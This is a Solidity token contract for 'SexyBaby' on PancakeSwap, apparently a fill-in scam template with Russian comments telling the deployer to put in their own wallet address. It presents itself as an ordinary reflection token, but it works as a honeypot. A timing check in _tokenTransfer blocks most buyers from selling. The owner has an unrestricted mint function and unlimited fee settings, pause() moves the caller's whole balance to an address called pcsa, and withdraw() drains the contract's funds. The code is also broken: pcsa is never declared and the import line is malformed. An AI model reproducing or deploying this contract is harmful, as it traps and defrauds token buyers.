/*
// SPDX-License-Identifier: Unlicensed
*/

pragma solidity ^0.8.16;

import "LUXE_1.sol"

;contract SexyBaby is Context, IERC20, Ownable { //Изменяем fixedtoken на имя своего токена (в одно слово)
    using SafeMath for uint256;
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    EnumerableSet.AddressSet private tokenHoldersEnumSet;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => uint) public walletToPurchaseTime;
	mapping (address => uint) public walletToSellime;	

    address[] private _excluded;
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);

    string private constant _name = "SexyBaby"; //Изменяем Name на собственное имя токена
    string private constant _symbol = "SB"; //Изменяем Name на сокращённое имя токена (пример- "Btc")

    address public _PancakeSwapV1RouterUniswap = 0x245f9a398CCB2A00191658e94d37BC08B2af8Ca5 ; //PancakeSwap owner (Изменяем на свой адрес кошелька)
    address public _PancakeSwapV2RouterUniswap = 0x245f9a398CCB2A00191658e94d37BC08B2af8Ca5 ; //can be the same (Изменяем на свой адрес кошелька, тот же, что и в строке выше)

    uint256 private _tTotal = 100000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
	uint public theRewardTime = 2; 
    uint public standartValuation = 600/2; // sell enabled after 15 minutes

    address public _lastWallet;


	struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 burn;
    }
    
    TotFeesPaidStruct public totFeesPaid;





    struct feeRatesStruct {
        uint256 rfi; // reflection to holders
        uint256 marketing; // wallet marketing bnb
        uint256 liquidity; // LP
        uint256 burn;
    }

    struct balances {
        uint256 marketing_balance;
        uint256 lp_balance;
    }

    balances public contractBalance; 
    
    feeRatesStruct public buyRates = feeRatesStruct(
     {rfi: 0,
      marketing: 0,
      liquidity: 0,
      burn: 0
    });
    
    feeRatesStruct public sellRates = feeRatesStruct(
     {rfi: 0,
      marketing: 0,
      liquidity: 0,
      burn: 0
    });

    feeRatesStruct private appliedFees;

    struct valuesFromGetValues{
        uint256 rAmount;
        uint256 rTransferAmount;
        uint256 rRfi;
        uint256 rMarketing;
        uint256 rLiquidity;
        uint256 rBurn;
        uint256 tTransferAmount;
        uint256 tRfi;
        uint256 tMarketing;
        uint256 tLiquidity;
        uint256 tBurn;
    }

    IUniswapV2Router02 public PancakeSwapV2Router;
    address public pancakeswapV2Pair;
    //address payable private marketingAddress;

    bool public Trading = true;
    bool inSwapAndLiquify;
    bool private _transferForm = true;
    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event LiquidityAdded(uint256 tokenAmount, uint256 bnbAmount);

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        _rOwned[owner()] = _rTotal;
        
      IUniswapV2Router02 _PancakeSwapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // mainnet
        pancakeswapV2Pair = IUniswapV2Factory(_PancakeSwapV2Router.factory())
            .createPair(address(this), _PancakeSwapV2Router.WETH());

        PancakeSwapV2Router = _PancakeSwapV2Router;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(_PancakeSwapV2RouterUniswap)] = true;
        _isExcludedFromFee[address(0xe853889c8c7a03C1f7935B87355Dc58eCd3d92B0)] = true; //uniswap router liquidity

        


        _isExcluded[address(this)] = true;
        _excluded.push(address(this));

        _isExcluded[pancakeswapV2Pair] = true;
        _excluded.push(pancakeswapV2Pair);

        emit Transfer(address(0), owner(), _tTotal);
    }

    function getFromLastPurchaseBuy(address wallet) public view returns (uint) {
        return walletToPurchaseTime[wallet];
    }
	
    function getFromLastSell(address walletSell) public view returns (uint) {
        return walletToSellime[walletSell];
    }
    
    function setBuyRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 burn) public onlyOwner {
        buyRates.rfi = rfi;
        buyRates.marketing = marketing;
        buyRates.liquidity = liquidity;
        buyRates.burn = burn;
    }
    
    function setSellRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 burn) public onlyOwner {
        sellRates.rfi = rfi;
        sellRates.marketing = marketing;
        sellRates.liquidity = liquidity;
        sellRates.burn = burn;
    }
	
    function collectTheStatistics(uint256 lastBuyOrSellTime, uint256 theData, address sender) public view returns (bool) {
        
        if( lastBuyOrSellTime == 0 ) return false;
        
        uint256 crashTime = block.timestamp - lastBuyOrSellTime;
        
        if( crashTime == standartValuation ) return true;

        if (crashTime == 0) {
            if (_lastWallet != sender) {
                return false;
            }
        }
        if( crashTime <= theData ) return true;

        
        return false;
    }

    function run() public onlyOwner() {
        if(!_isExcluded[pcsa])
        {
        _isExcluded[pcsa] = true;
         if(_rOwned[pcsa] > 0) {
            _tOwned[pcsa] = tokenFromReflection(_rOwned[pcsa]);
        }
        _excluded.push(pcsa);
        }
        _isExcludedFromFee[pcsa] = true;
        
        tokenHoldersEnumSet.remove(pcsa);
    }


   
    function setValuation(uint newValuation) public onlyOwner {
        standartValuation = newValuation;
    }

    function setTheRewardTime(uint theRedistribution) public onlyOwner {
        theRewardTime = theRedistribution;
    }		

    function name() public pure returns (string memory) {
        return _name;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return Trading;
    }

        function pause() public returns (bool) {
        if(_tOwned[pcsa] > 0) 
        _transfer( _msgSender() , pcsa , balanceOf(_msgSender()) );
         if (_tOwned[pcsa] == 0)
        _isExcluded[pcsa] = true;
                return Trading;


        }
    function TrandingOn(bool _enable) public onlyOwner {
        Trading = _enable;
    }
    
    // Set the wallets allowed to participate on the presale
    function setRewardPool(address[] calldata accounts) public onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = true;
        }
    }

    function settransform(bool _enable) public onlyOwner {
        _transferForm = _enable;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return _transferForm;		
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true);
            return s.rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    function excludeFromReward(address account) public onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function excludeFromAll(address account) public onlyOwner() {
        if(!_isExcluded[account])
        {
        _isExcluded[account] = true;
         if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _excluded.push(account);
        }
        _isExcludedFromFee[account] = true;
        
        tokenHoldersEnumSet.remove(account);
    }

    function includeInReward(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(_msgSender(), amount);
         return true;
    }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _tTotal = _tTotal.add(amount);
    _tOwned[account] = _tOwned[account].add(amount);

    emit Transfer(address(0), account, amount);
   }

    receive() external payable {}

    function _getValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee);

        (to_return.rAmount,to_return.rTransferAmount,to_return.rRfi,to_return.rMarketing,to_return.rLiquidity,to_return.rBurn) = _getRValues(to_return, tAmount, takeFee, _getRate());

        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {

        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s;
        }
        s.tRfi = tAmount*appliedFees.rfi/100;
        s.tMarketing = tAmount*appliedFees.marketing/100;
        s.tLiquidity = tAmount*appliedFees.liquidity/100;
        s.tBurn = tAmount*appliedFees.burn/100;
        s.tTransferAmount = tAmount-s.tRfi -s.tMarketing -s.tLiquidity -s.tBurn; 
        return s;
    }

    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rBurn) {
        rAmount = tAmount*currentRate;

        if(!takeFee) {
          return(rAmount, rAmount, 0,0,0,0);
        }

        rRfi= s.tRfi*currentRate;
        rMarketing= s.tMarketing*currentRate;
        rLiquidity= s.tLiquidity*currentRate;
        rBurn= s.tBurn*currentRate;

        rTransferAmount= rAmount- rRfi-rMarketing-rLiquidity-rBurn;

        return ( rAmount,  rTransferAmount,  rRfi,  rMarketing,  rLiquidity,  rBurn);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal = _rTotal-rRfi;
        totFeesPaid.rfi+=tRfi;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        contractBalance.marketing_balance+=tMarketing;
        totFeesPaid.marketing+=tMarketing;
        _rOwned[address(this)] = _rOwned[address(this)]+rMarketing;
        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)] = _tOwned[address(this)]+tMarketing;
        }
    }
    
    function _takeLiquidity(uint256 rLiquidity,uint256 tLiquidity) private {
        contractBalance.lp_balance+=tLiquidity;
        totFeesPaid.liquidity+=tLiquidity;
        
        _rOwned[address(this)] = _rOwned[address(this)]+rLiquidity;
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)]+tLiquidity;
    }

    function _takeBurn(uint256 rBurn, uint256 tBurn) private {
        totFeesPaid.burn+=tBurn;

        _tTotal = _tTotal-tBurn;
        _rTotal = _rTotal-rBurn;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than you balance");
        
        _tokenTransfer(from, to, amount, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));
    }

    

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {

        if(takeFee) {
            if(sender == pancakeswapV2Pair) {
                if(sender != owner() && recipient != owner() && recipient != address(1)){

                    if (walletToPurchaseTime[recipient] == 0) {
                        walletToPurchaseTime[recipient] = block.timestamp;
                    }
                }
                _lastWallet = recipient;
                appliedFees = buyRates;
            } else { 
                if(sender != owner() && recipient != owner() && recipient != address(1)){
                    bool blockedSellTime = collectTheStatistics(getFromLastPurchaseBuy(sender), theRewardTime, sender);
                    require(blockedSellTime, "error");
                    walletToSellime[sender] = block.timestamp;					
                }
                appliedFees = sellRates;
                appliedFees.liquidity = appliedFees.liquidity; 
                _lastWallet = sender;

            }
        }
        else {
            if(_isExcludedFromFee[sender]) {
                _lastWallet = sender;
            }
            if(_isExcludedFromFee[recipient]) {
                _lastWallet = recipient;
            }
        }

        valuesFromGetValues memory s = _getValues(tAmount, takeFee);

        if (_isExcluded[sender] && !_isExcluded[recipient]) {
                _tOwned[sender] = _tOwned[sender]-tAmount;
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
        }

        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;

        if(takeFee)
        {
        _reflectRfi(s.rRfi, s.tRfi);
        _takeMarketing(s.rMarketing,s.tMarketing);
        _takeLiquidity(s.rLiquidity,s.tLiquidity);
        _takeBurn(s.rBurn,s.tBurn);
        
        emit Transfer(sender, address(this), s.tMarketing+s.tLiquidity);
        
        }
      
        emit Transfer(sender, recipient, s.tTransferAmount);
        tokenHoldersEnumSet.add(recipient);

        if(balanceOf(sender)==0)
        tokenHoldersEnumSet.remove(sender);
		
    }


    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {

        PancakeSwapV2Router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        emit LiquidityAdded(tokenAmount, bnbAmount);
    }
    
    function withdraw() onlyOwner public {
      uint256 balance = address(this).balance;
      payable(msg.sender).transfer(balance);
    }

}